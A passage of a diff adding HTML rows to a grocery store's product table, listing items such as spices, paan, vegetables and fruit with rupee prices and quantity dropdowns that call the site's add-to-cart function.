+	                  <option  value="4-Bunch">4 - Bunch</option>
+	                  <option  value="5-Bunch">5 - Bunch</option>
+	                  <option  value="6-Bunch">6 - Bunch</option>
+	                  <option  value="7-Bunch">7 - Bunch</option>
+	                  <option  value="8-Bunch">8 - Bunch</option>
+	                  <option  value="9-Bunch">9 - Bunch</option>
+	                  <option  value="10-Bunch">10 - Bunch</option>
+					  <option  value="11-Bunch">11 - Bunch</option>
+					  <option  value="12-Bunch">12 - Bunch</option>
+					  <option  value="13-Bunch">13 - Bunch</option>
+					  <option  value="14-Bunch">14 - Bunch</option>
+					  <option  value="15-Bunch">15 - Bunch</option>
+					  <option  value="16-Bunch">16 - Bunch</option>
+					  <option  value="17-Bunch">17 - Bunch</option>
+					  <option  value="18-Bunch">18 - Bunch</option>
+					  <option  value="19-Bunch">19 - Bunch</option>
+					  <option  value="20-Bunch">20 - Bunch</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice291">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/i/m/img_2606.jpg" width="115" height="115" alt="Pani Puri Masala (Liquid Form)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/pani-puri-masala-liquid-form.html">Pani Puri Masala (Liquid Form)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs15.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 1015, 'http://www.citybigmart.com/index.php/','15.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice1015">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/b/a/bangla_paan.jpg" width="115" height="115" alt="Bangla paan (5 nos)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/meetha-paan-5nos-1095.html">Bangla paan (5 nos)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs15.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 933, 'http://www.citybigmart.com/index.php/','15.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice933">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/p/u/pumpking.jpg" width="115" height="115" alt="Pumpkin cubes(200 gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/pumpkin-cubes-200-gm.html">Pumpkin cubes(200 gm)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs15.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 286, 'http://www.citybigmart.com/index.php/','15.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice286">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/m/a/maggi-imli-pichkoo-80gm-.jpg" width="115" height="115" alt="Imli Pichkoo (80 gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/imli-pichkoo-80-gm.html">Imli Pichkoo (80 gm)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs15.00</span>
+
+	 / Kg	</td>
+	<td style="border-bottom: 1px solid activecaption">
+	
+
+					<select onchange="javascript:ajaxaddtocart(this.value, 1013, 'http://www.citybigmart.com/index.php/','15.0000');" id="QuantityId" name="QuantityId">
+                      <option value="0">0 - Gm</option>
+	                  <option  value="250">250 - Gm</option>
+	                  <option  value="500">500 - Gm</option>
+	                  <option  value="750">750 - Gm</option>
+	                  <option  value="1">1 - Kg</option>
+	                  <option  value="1.25">1.25 - Kg</option>
+	                  <option  value="1.5">1.5 - Kg</option>
+	                  <option  value="1.75">1.75 - Kg</option>
+	                  <option  value="2">2 - Kg</option>
+	                  <option  value="2.25">2.25 - Kg</option>
+	                  <option  value="2.5">2.5 - Kg</option>
+	                  <option  value="2.75">2.75 - Kg</option>
+	                  <option  value="3">3 - Kg</option>
+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice1013">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/m/e/meetha_paan.jpg" width="115" height="115" alt="Meetha paan (5 nos)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/meetha-paan-5nos.html">Meetha paan (5 nos)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs15.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 274, 'http://www.citybigmart.com/index.php/','15.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice274">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/r/e/red_onion.jpg" width="115" height="115" alt="Onion(Lal Pyaj)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/onion-red.html">Onion(Lal Pyaj)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs15.00</span>
+
+	 / Kg	</td>
+	<td style="border-bottom: 1px solid activecaption">
+	
+
+					<select onchange="javascript:ajaxaddtocart(this.value, 24, 'http://www.citybigmart.com/index.php/','15.0000');" id="QuantityId" name="QuantityId">
+                      <option value="0">0 - Gm</option>
+	                  <option  value="250">250 - Gm</option>
+	                  <option  value="500">500 - Gm</option>
+	                  <option  value="750">750 - Gm</option>
+	                  <option  value="1">1 - Kg</option>
+	                  <option  value="1.25">1.25 - Kg</option>
+	                  <option  value="1.5">1.5 - Kg</option>
+	                  <option  value="1.75">1.75 - Kg</option>
+	                  <option  value="2">2 - Kg</option>
+	                  <option  value="2.25">2.25 - Kg</option>
+	                  <option  value="2.5">2.5 - Kg</option>
+	                  <option  value="2.75">2.75 - Kg</option>
+	                  <option  value="3">3 - Kg</option>
+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice24">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/m/a/main_baby-potato.png" width="115" height="115" alt="Baby Potato (Dum Aalu)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/baby-potato-dum-aalu.html">Baby Potato (Dum Aalu)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs20.00</span>
+
+	 / Kg	</td>
+	<td style="border-bottom: 1px solid activecaption">
+	
+
+					<select onchange="javascript:ajaxaddtocart(this.value, 996, 'http://www.citybigmart.com/index.php/','20.0000');" id="QuantityId" name="QuantityId">
+                      <option value="0">0 - Gm</option>
+	                  <option  value="250">250 - Gm</option>
+	                  <option  value="500">500 - Gm</option>
+	                  <option  value="750">750 - Gm</option>
+	                  <option  value="1">1 - Kg</option>
+	                  <option  value="1.25">1.25 - Kg</option>
+	                  <option  value="1.5">1.5 - Kg</option>
+	                  <option  value="1.75">1.75 - Kg</option>
+	                  <option  value="2">2 - Kg</option>
+	                  <option  value="2.25">2.25 - Kg</option>
+	                  <option  value="2.5">2.5 - Kg</option>
+	                  <option  value="2.75">2.75 - Kg</option>
+	                  <option  value="3">3 - Kg</option>
+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice996">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/d/a/dabeli_masala.jpg" width="115" height="115" alt="Dabeli  Masala(pack of 100gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/dabeli-masala-pack-of-100gm.html">Dabeli  Masala(pack of 100gm)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs20.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 1024, 'http://www.citybigmart.com/index.php/','20.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice1024">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/i/m/images_2_21.jpg" width="115" height="115" alt="Pani Puri Raw (Pack of 50 pic)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/pani-puri-raw-pack-of-50-80-pic.html">Pani Puri Raw (Pack of 50 pic)</a></td>
+	<td style="border-bottom: 1px solid activecaption">		<div class="price-box">
+
+            <p class="old-price">
+                <span class="price-label">Regular Price:</span>
+                <span id="old-price-3" class="price">
+                    <span class="price">Rs25.00</span>                </span>
+            </p>
+
+            <p class="special-price">
+                <span class="price-label">Special Price:</span>
+                <span id="product-price-3" class="price">
+                    <span class="price">Rs20.00</span>               </span>
+            </p>
+
+
+        </div><br>
+		
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 1014, 'http://www.citybigmart.com/index.php/','20.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice1014">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/d/e/desi_1.jpg" width="115" height="115" alt="Tomato Desi" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/desi-tamatar.html">Tomato Desi</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs22.00</span>
+
+	 / Kg	</td>
+	<td style="border-bottom: 1px solid activecaption">
+	
+
+					<select onchange="javascript:ajaxaddtocart(this.value, 255, 'http://www.citybigmart.com/index.php/','22.0000');" id="QuantityId" name="QuantityId">
+                      <option value="0">0 - Gm</option>
+	                  <option  value="250">250 - Gm</option>
+	                  <option  value="500">500 - Gm</option>
+	                  <option  value="750">750 - Gm</option>
+	                  <option  value="1">1 - Kg</option>
+	                  <option  value="1.25">1.25 - Kg</option>
+	                  <option  value="1.5">1.5 - Kg</option>
+	                  <option  value="1.75">1.75 - Kg</option>
+	                  <option  value="2">2 - Kg</option>
+	                  <option  value="2.25">2.25 - Kg</option>
+	                  <option  value="2.5">2.5 - Kg</option>
+	                  <option  value="2.75">2.75 - Kg</option>
+	                  <option  value="3">3 - Kg</option>
+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice255">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/g/a/garlic.jpg" width="115" height="115" alt="Garlic/Lahsun(125 gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/garlic-lasun.html">Garlic/Lahsun(125 gm)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs22.50</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 29, 'http://www.citybigmart.com/index.php/','22.5000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice29">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/w/a/watermelon_2.jpg" width="115" height="115" alt="Watermelon(Tarbooz)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/watermelon-tarbooj.html">Watermelon(Tarbooz)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs24.00</span>
+
+	 / Kg	</td>
+	<td style="border-bottom: 1px solid activecaption">
+	
+
+					<select onchange="javascript:ajaxaddtocart(this.value, 963, 'http://www.citybigmart.com/index.php/','24.0000');" id="QuantityId" name="QuantityId">
+                      <option value="0">0 - Gm</option>
+	                  <option  value="250">250 - Gm</option>
+	                  <option  value="500">500 - Gm</option>
+	                  <option  value="750">750 - Gm</option>
+	                  <option  value="1">1 - Kg</option>
+	                  <option  value="1.25">1.25 - Kg</option>
+	                  <option  value="1.5">1.5 - Kg</option>
+	                  <option  value="1.75">1.75 - Kg</option>
+	                  <option  value="2">2 - Kg</option>
+	                  <option  value="2.25">2.25 - Kg</option>
+	                  <option  value="2.5">2.5 - Kg</option>
+	                  <option  value="2.75">2.75 - Kg</option>
+	                  <option  value="3">3 - Kg</option>
+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice963">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/k/i/kiwi.jpg" width="115" height="115" alt="Kiwi" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/kiwi.html">Kiwi</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs24.00</span>
+
+	 / Nos. 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 556, 'http://www.citybigmart.com/index.php/','24.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Nos</option>
+	                  <option  value="1-Nos">1 - Nos</option>
+	                  <option  value="2-Nos">2 - Nos</option>
+	                  <option  value="3-Nos">3 - Nos</option>
+	                  <option  value="4-Nos">4 - Nos</option>
+	                  <option  value="5-Nos">5 - Nos</option>
+	                  <option  value="6-Nos">6 - Nos</option>
+	                  <option  value="7-Nos">7 - Nos</option>
+	                  <option  value="8-Nos">8 - Nos</option>
+	                  <option  value="9-Nos">9 - Nos</option>
+	                  <option  value="10-Nos">10 - Nos</option>
+					  <option  value="11-Nos">11 - Nos</option>
+					  <option  value="12-Nos">12 - Nos</option>
+					  <option  value="13-Nos">13 - Nos</option>
+					  <option  value="14-Nos">14 - Nos</option>
+					  <option  value="15-Nos">15 - Nos</option>
+					  <option  value="16-Nos">16 - Nos</option>
+					  <option  value="17-Nos">17 - Nos</option>
+					  <option  value="18-Nos">18 - Nos</option>
+					  <option  value="19-Nos">19 - Nos</option>
+					  <option  value="20-Nos">20 - Nos</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice556">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/s/o/soya-chunks-500x500.jpg" width="115" height="115" alt="Soya Chunks (Soya Wadi 250gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/soya-chunks-soya-wadi-250gm.html">Soya Chunks (Soya Wadi 250gm)</a></td>
